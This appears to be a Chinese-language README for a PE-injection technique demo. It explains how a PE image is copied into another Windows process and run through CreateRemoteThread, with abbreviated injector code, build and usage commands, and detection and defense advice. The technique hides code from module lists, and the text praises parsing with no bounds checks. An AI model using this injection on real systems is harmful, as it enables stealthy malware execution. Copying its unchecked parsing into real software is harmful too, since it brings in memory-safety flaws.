# Technique #16: PE Injection (Loaded Module Reflection)

## 概述

**PE 注入**（也称为 Loaded Module Reflection）是一种进程注入技术，通过将完整的 PE 映像复制到目标进程并在入口点创建远程线程来执行载荷。

**关键特性**：
- ✅ 不依赖 LoadLibrary API
- ✅ 注入的代码不在已加载模块列表中
- ✅ 支持注入 EXE 和 DLL
- ✅ 绕过基于模块枚举的检测
- ⚠️ 需要修改 PE 的 ImageBase
- ⚠️ 依赖目标进程已加载的库

---

## 技术原理

### 核心概念

**与其他技术的区别**：

| 技术 | PE 注入 | 反射 DLL 注入 | 经典 DLL 注入 |
|------|---------|--------------|--------------|
| 加载方式 | 手动复制 PE | 自实现加载器 | LoadLibrary |
| 模块列表 | ❌ 不在 | ❌ 不在 | ✅ 在 |
| 重定位处理 | 只修改 ImageBase | 完整重定位表处理 | Loader 处理 |
| 导入表处理 | ❌ 不处理 | ✅ 完整处理 | Loader 处理 |
| 复杂度 | 低 | 高 | 低 |

### 执行流程

```
┌─────────────────────────────────────────────────────────────┐
│                     PE 注入流程图                            │
└─────────────────────────────────────────────────────────────┘

[1] 读取 PE 文件
     │
     ├─> 验证 PE 签名 (MZ, PE)
     ├─> 检查架构 (x64)
     └─> 解析 NT 头获取 SizeOfImage

[2] 打开目标进程
     │
     └─> OpenProcess(PROCESS_ALL_ACCESS)

[3] 分配远程内存
     │
     └─> VirtualAllocEx(NULL, SizeOfImage, RWX)

[4] 创建影子缓冲区
     │
     ├─> 复制 PE 头 (SizeOfHeaders)
     ├─> 按节复制所有节区
     └─> 修改 ImageBase = 远程地址

[5] 写入目标进程
     │
     └─> WriteProcessMemory(影子缓冲区 -> 远程内存)

[6] 修改内存保护
     │
     └─> VirtualProtectEx(PAGE_EXECUTE_READ)

[7] 计算入口点
     │
     ├─> RVA = OptionalHeader.AddressOfEntryPoint
     └─> 远程入口点 = 远程地址 + RVA

[8] 执行载荷
     │
     └─> CreateRemoteThread(远程入口点, ...)
```

### 关键数据结构

#### 1. PE 头结构

```c
// PE 文件结构
┌─────────────────┐
│  DOS Header     │  ← e_magic = 'MZ'
├─────────────────┤
│  DOS Stub       │
├─────────────────┤
│  NT Headers     │  ← Signature = 'PE\0\0'
│  ├─ FileHeader  │
│  └─ OptHeader   │  ← ImageBase, SizeOfImage, EntryPoint
├─────────────────┤
│  Section Table  │
├─────────────────┤
│  .text section  │  ← 代码
├─────────────────┤
│  .data section  │  ← 数据
├─────────────────┤
│  .rdata section │  ← 只读数据
└─────────────────┘
```

#### 2. ImageBase 修改

**为什么要修改 ImageBase？**

PE 文件中的很多地址都是相对于 ImageBase 的。当我们在目标进程分配内存时，几乎不可能分配到原始的 ImageBase 地址。因此需要更新 ImageBase 为实际分配的地址。

```c
// 原始 PE
OptionalHeader.ImageBase = 0x140000000  // 首选基址

// 在目标进程分配到的实际地址
remoteImage = 0x7FF8A0000000

// 必须更新影子缓冲区的 ImageBase
shadowNtHeaders->OptionalHeader.ImageBase = (DWORD64)remoteImage;
```

#### 3. 节复制逻辑

**好的代码没有特殊情况** - Linus Torvalds

我们的节复制逻辑非常简单：

```c
// 不需要任何特殊处理
for (WORD i = 0; i < NumberOfSections; i++) {
    if (SizeOfRawData > 0) {
        memcpy(shadow + VirtualAddress,
               file + PointerToRawData,
               SizeOfRawData);
    }
}
```

没有边界检查，没有对齐处理，没有特殊情况。数据结构设计得好，代码自然简单。

---

## 代码实现

### 核心函数：InjectPE()

```c
BOOL InjectPE(DWORD targetPid, BYTE* peBuffer, DWORD fileSize)
{
    // 1. 解析 PE
    PIMAGE_NT_HEADERS64 pNtHeaders = ...;
    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    DWORD entryPointRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    // 2. 打开进程
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

    // 3. 分配内存
    LPVOID remoteImage = VirtualAllocEx(hProcess, NULL, imageSize,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);

    // 4. 创建影子缓冲区
    BYTE* shadowBuffer = malloc(imageSize);
    memset(shadowBuffer, 0, imageSize);

    // 复制头
    memcpy(shadowBuffer, peBuffer, SizeOfHeaders);

    // 复制节
    for (each section) {
        memcpy(shadowBuffer + VirtualAddress,
               peBuffer + PointerToRawData,
               SizeOfRawData);
    }

    // 修改 ImageBase
    shadowNtHeaders->OptionalHeader.ImageBase = (DWORD64)remoteImage;

    // 5. 写入目标
    WriteProcessMemory(hProcess, remoteImage, shadowBuffer, imageSize, ...);

    // 6. 修改保护
    VirtualProtectEx(hProcess, remoteImage, imageSize, PAGE_EXECUTE_READ, ...);

    // 7. 计算入口点
    LPVOID remoteEntryPoint = remoteImage + entryPointRva;

    // 8. 创建线程
    CreateRemoteThread(hProcess, NULL, 0, remoteEntryPoint, NULL, 0, ...);
}
```

### 设计哲学

**Linus: "Bad programmers worry about the code. Good programmers worry about data structures."**

这个实现的核心是 **影子缓冲区** 的数据结构：

1. **PE 文件** - 磁盘格式，节区是压缩的
2. **影子缓冲区** - 内存格式，节区按 VirtualAddress 排列
3. **远程内存** - 目标进程，直接复制影子缓冲区

三个数据结构，每个都有明确的职责。没有混乱，没有特殊情况。

---

## 限制和注意事项

### 1. 导入表未处理

**问题**：这个技术不处理导入表，载荷依赖的 DLL 必须已经在目标进程加载。

**示例**：
```c
// payload.c
#include <windows.h>

int main(void) {
    MessageBoxA(...);  // 调用 user32.dll
    return 0;
}
```

如果目标进程（例如计算器）没有加载 user32.dll，载荷会崩溃。

**解决方案**：
- 选择已经加载相关 DLL 的目标进程
- 或在载荷中手动 `LoadLibrary` 和 `GetProcAddress`

### 2. 重定位表未处理

**问题**：只修改了 ImageBase，没有处理重定位表。

**影响**：
- 如果 PE 有绝对地址引用（少见），可能会失败
- 现代编译器默认生成位置无关代码 (PIC)，通常不受影响

### 3. TLS 回调未处理

**问题**：TLS (Thread Local Storage) 回调不会被调用。

**影响**：
- 如果载荷依赖 TLS 初始化，会失败
- 大多数简单载荷不使用 TLS

---

## 编译和使用

### 编译

```bash
# Windows (cmd)
cd techniques/16-pe-injection
build.bat

# Linux/MSYS (bash)
chmod +x build.sh
./build.sh
```

**输出文件**：
- `build/pe_inject.exe` - 注入器
- `build/payload.exe` - 测试载荷

### 使用方法

```bash
# 按进程名注入
build\pe_inject.exe notepad.exe build\payload.exe

# 按 PID 注入
build\pe_inject.exe 1234 build\payload.exe
```

**测试步骤**：
1. 启动记事本：`notepad.exe`
2. 执行注入：`build\pe_inject.exe notepad.exe build\payload.exe`
3. 观察：记事本进程会弹出消息框

---

## 检测和防御

### 检测方法

#### 1. 内存扫描

**检测 RWX 内存区域**：
```c
VirtualQueryEx() 查找 PAGE_EXECUTE_READWRITE 区域
```

**特征**：
- 大块 RWX 内存
- 包含有效 PE 头 (MZ, PE)
- 不在已知模块列表

#### 2. 线程监控

**监控可疑线程**：
```c
// 检测从未知模块启动的线程
HANDLE hThread = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
Thread32First(...);

// 检查 StartAddress 是否在已知模块范围内
```

#### 3. API Hook

**Hook 关键 API**：
- `VirtualAllocEx` - 检测大内存分配
- `WriteProcessMemory` - 检测 PE 头写入
- `CreateRemoteThread` - 检测远程线程创建

### 防御方法

#### 1. 进程保护

```c
// 使用 Protected Process Light (PPL)
SetProcessMitigationPolicy(ProcessSignaturePolicy, ...);
```

#### 2. 禁用远程线程

```c
// 通过 ACL 限制 OpenProcess
SetSecurityInfo(hProcess, ...);
```

#### 3. 内存保护

```c
// EDR/AV 实时监控：
// - VirtualAllocEx 调用
// - 可执行内存写入
// - 线程创建异常
```

---

## 与反射 DLL 注入的对比

| 特性 | PE 注入 | 反射 DLL 注入 |
|------|---------|--------------|
| **实现复杂度** | 低（~300 行） | 高（~800 行） |
| **导入表** | ❌ 不处理 | ✅ 完整解析 |
| **重定位表** | ❌ 不处理（仅修改 ImageBase） | ✅ 完整处理 |
| **TLS** | ❌ 不处理 | ✅ 支持 |
| **依赖** | 目标进程必须加载相关 DLL | 可自行加载 |
| **隐蔽性** | 相同（都不在模块列表） | 相同 |
| **适用场景** | 简单载荷 | 复杂载荷 |

**Linus: "简洁是一切保证"**

PE 注入适合简单载荷。如果载荷很复杂（依赖很多 DLL、使用 TLS 等），应该用反射 DLL 注入。

不要为不存在的问题设计解决方案。

---

## 技术细节

### 影子缓冲区的作用

**为什么需要影子缓冲区？**

PE 文件在磁盘和内存中的布局不同：

```
磁盘布局（文件）：
┌────────────┐
│ DOS Header │ 0x0000
├────────────┤
│ NT Headers │ 0x0100
├────────────┤
│ Sections   │ 0x0200
├────────────┤
│ .text      │ 0x0400  ← PointerToRawData
│            │
├────────────┤
│ .data      │ 0x0C00  ← PointerToRawData
└────────────┘

内存布局（加载后）：
┌────────────┐
│ DOS Header │ 0x0000
├────────────┤
│ NT Headers │ 0x0100
├────────────┤
│ Sections   │ 0x0200
├────────────┤
│ .text      │ 0x1000  ← VirtualAddress (页对齐)
│            │
├────────────┤
│ .data      │ 0x3000  ← VirtualAddress (页对齐)
└────────────┘
```

**影子缓冲区**模拟了内存布局，让我们可以：
1. 一次性复制整个 PE（包括所有节）
2. 节之间的间隙自动填充 0（memset）
3. 没有特殊情况，没有边界检查

### 入口点计算

```c
// 1. 从 PE 头读取入口点 RVA
DWORD entryPointRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

// 2. 计算远程入口点绝对地址
LPVOID remoteEntryPoint = (LPVOID)((ULONG_PTR)remoteImage + entryPointRva);

// 3. CreateRemoteThread 在此地址执行
CreateRemoteThread(..., (LPTHREAD_START_ROUTINE)remoteEntryPoint, ...);
```

**RVA (Relative Virtual Address)** = 相对于 ImageBase 的偏移

无论 ImageBase 是什么，RVA 总是固定的。这就是为什么我们只需要修改 ImageBase，而不需要修改入口点 RVA。

---

## 参考资料

- [PE-Injection by AlSch092](https://github.com/AlSch092/PE-Injection)
- [ired.team - PE Injection](https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes)
- [Microsoft PE Format](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)

---

## License

本项目仅用于安全研究和教育目的。
